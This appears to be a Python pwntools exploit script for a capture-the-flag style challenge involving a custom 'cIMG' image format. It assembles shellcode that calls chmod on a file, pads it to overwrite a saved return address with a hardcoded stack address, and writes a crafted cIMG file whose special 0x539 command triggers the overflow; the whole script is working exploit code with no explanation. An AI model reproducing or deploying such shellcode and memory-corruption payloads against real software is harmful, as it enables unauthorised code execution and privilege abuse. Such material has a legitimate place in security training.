import struct
from pwn import *
context.arch = 'amd64'  # …Ë÷√º‹ππŒ™ x86


color ={"red":  b"\xff\x00\x00",
        "white":b"\xff\xff\xff",
        "green":b"\x00\xff\x00",
        "grey": b"\x80\x80\x80",
        "blue": b"\x00\x00\xff"
        }


width = 76
height = 24

shellcode_asm = """
            push 0x41
            mov rdi, rsp
            mov sil, 0x4
            mov al, 0x5a
            syscall
"""
shellcode = asm(shellcode_asm)

shellcode += b"A"*(0xA8 - len(shellcode)) + 0x00007fffffffd260.to_bytes(8, "little")
shellcode += b"A"*(width*height - len(shellcode))

with open('fla', 'wb') as f:
    f.write(shellcode)



def handle_1337():
    sprite = 0
    cimg_bytes = b""
    command_c = 0
    c_base_x = width - 1
    c_base_y = 0
    cimg_bytes += b"\x05\x00" + sprite.to_bytes(1, "little") + int(76).to_bytes(1, "little") + int(24).to_bytes(1, "little")
    # for row in extracted_rows:
    #     cimg_bytes += row[width-1][3].to_bytes(1, "little")
        # cimg_bytes += row[0][3].to_bytes(1, "little")
    cimg_bytes += b"./fla\x00"
    cimg_bytes += b"\x00"*(258 - 9)
    command_c += 1

    cimg_bytes += b"\x04\x00" + sprite.to_bytes(1, "little") + color["white"] +c_base_x.to_bytes(1, "little") + c_base_y.to_bytes(1, "little") + 0x1.to_bytes(1, "little") + 0x1.to_bytes(1, "little") + 0xff.to_bytes(1, "little")
    command_c += 1

    cimg_bytes += b"\x39\x05" + b"\x00\x00\x00\xb0\x01"
    command_c += 1

    return command_c, cimg_bytes

command_c, cimg_data = handle_1337()
cimg = b'\x63\x49\x4D\x47' + b"\x04\x00" + width.to_bytes(1,"little") + height.to_bytes(1, "little") + command_c.to_bytes(4, "little") + cimg_data


with open('test.bin', 'wb') as f:
    f.write(cimg)



